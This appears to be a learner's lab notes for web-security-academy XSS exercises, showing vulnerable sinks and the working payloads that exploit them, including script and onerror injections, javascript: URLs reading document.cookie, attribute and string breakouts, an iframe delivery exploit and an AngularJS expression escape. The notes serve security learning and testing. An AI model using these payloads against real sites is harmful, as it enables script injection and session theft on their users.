### DOM XSS in `document.write` sink using source `location.search`
```js
// see that my search string ends up in <img> tag:

<img src="/resources/images/tracker.gif?searchTerms=adsf" q7yoldkbi="">

// adjust search string to inject xss via <img> tag

sadf"><script>alert(1)</script>
```

### DOM XSS in `innerHTML` sink using source `location.search`
```js
// view-source / inspect element
// see that my search string ends up in <span> tag:

<span id="searchMessage">fake</span>

// break out
// key: force an error to trigger "onerror"

<img src=1 onerror=alert(1)>
<audio src/onerror=alert(2)>

// other key notes: it's totally ok to inject javascript as-is into <span> tags
```

### DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
```js
// see that '/feedback?returnPath=/' returns HTTP response with "src" calling "jquery":

<script src="/resources/js/jquery_1-8-2.js"></script>
<div class="is-linkback">
	<a id="backLink">Back</a>
</div>
<script>
	$(function() {
		$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
	});
</script>

// see that a <href> tag is being built, using the input passed to "returnPath"
// try inject random chars to "returnPath":

/feedback?returnPath=asdf

// see that the resulting "Back" link leads to:

https://0af3007a032c23bcc10958b000a10065.web-security-academy.net/asdf

// now inject 

/feedback?returnPath=javascript:alert(document.cookie) 

// now the "Back" link simply reads:

javascript:alert(document.cookie)

// note: this uses the `javascript:` protocol to run text as JavaScript instead of opening it as a normal link
// sauce: https://riptutorial.com/html/example/2120/link-that-runs-javascript
```

### DOM XSS in jQuery selector sink `$()` using a hashchange event
```js
// vulnerable portion:

<script src="/resources/js/jquery_1-8-2.js"></script>
<script src="/resources/js/jqueryMigrate_1-4-1.js"></script>
<script>
	$(window).on('hashchange', function(){
		var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
		if (post) post.get(0).scrollIntoView();
	});
</script>

// exploit via iframe (deliver to victim):

<iframe src="https://0a8200b703a078abc312925a0003009d.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

// test that "print()" does get called when this payload runs normally
// now deliver the payload
```

### Reflected XSS into attribute with angle brackets HTML-encoded [helpful but not direct sauce](https://www.secjuice.com/xss-arithmetic-operators-chaining-bypass-sanitization/)
```js
// normal "<h1>hola</h1>" injection becomes:

&lt;h1&gt;hola&lt;/h1&gt;

// try avoiding angular brackets altogether; study the environment closely
// notice that "hola" lands in a HTML attribute for an <input> tag:

<input type=text placeholder='Search the blog...' name=search value="hola">

// target that attribute; close it gracefully and inject an event

/?search="onmouseover="alert('hola')

// such that the <input> tag becomes:

<input type=text placeholder='Search the blog...' name=search value=""onmouseover="alert('hola')">
```

### Stored XSS into anchor `href` attribute with double quotes HTML-encoded
```js
// see the sink:

<a id="author" href="https://www.fake.com">fake</a>

// adjust "website" payload:

javascript:alert(1)

// now the href sink becomes:

<a id="author" href="javascript:alert('hola')">

// end of the day, it's due to lack of input validation on "website" field
```

### Reflected XSS into a JavaScript string with angle brackets HTML encoded
```js
// sink:

<script>
var searchTerms = 'asdf';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>

// break out of "encodeURIComponent()":

a'-alert('hola')-'

// sink becomes:

<script>
var searchTerms = 'a'-alert('hola')-'';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>

// turns out it's nothing to do with the "encodeURIComponent()" - we're targeting the "var searchTerms" instead
```

### DOM XSS in `document.write` sink using source `location.search` inside a select element
```js
// vulnerable portion:

<form id="stockCheckForm" action="/product/stock" method="POST">
	<input required type="hidden" name="productId" value="2">
	<script>
		var stores = ["London","Paris","Milan"];
		var store = (new URLSearchParams(window.location.search)).get('storeId'); //supply "storeId" in params
		document.write('<select name="storeId">');
		if(store) { //right here
			document.write('<option selected>'+store+'</option>');
		}
		for(var i=0;i<stores.length;i++) {
			if(stores[i] === store) {
				continue;
			}
			document.write('<option>'+stores[i]+'</option>');
		}
		document.write('</select>');
	</script>
	<button type="submit" class="button">Check stock</button>
</form>
<span id="stockCheckResult"></span>
<script src="/resources/js/stockCheckPayload.js"></script>
<script src="/resources/js/stockCheck.js"></script>

// payload

/product?productId=2&storeId=alert(1)

// now the list has "alert(1)", but nothing executes

/product?productId=2&storeId=javascript:alert(1)

// now the list has "javascript:alert(1)", but again nothing executes

/product?productId=2&storeId=<script>alert(1)</script>

// now it executes
```

### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded [sauce](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md#storedreflected-xss---simple-alert-in-angularjs)
```js
// nothing fancy - just see that there's a AngularJS being used:

/resources/js/angular_1-7-7.js

/*
 AngularJS v1.7.7
 (c) 2010-2018 Google, Inc. http://angularjs.org
 License: MIT
*/

// then just use this payload:

{{constructor.constructor('alert(1)')()}}

// how it looks like:

/?search=asdf{{constructor.constructor('alert(1)')()}}
```

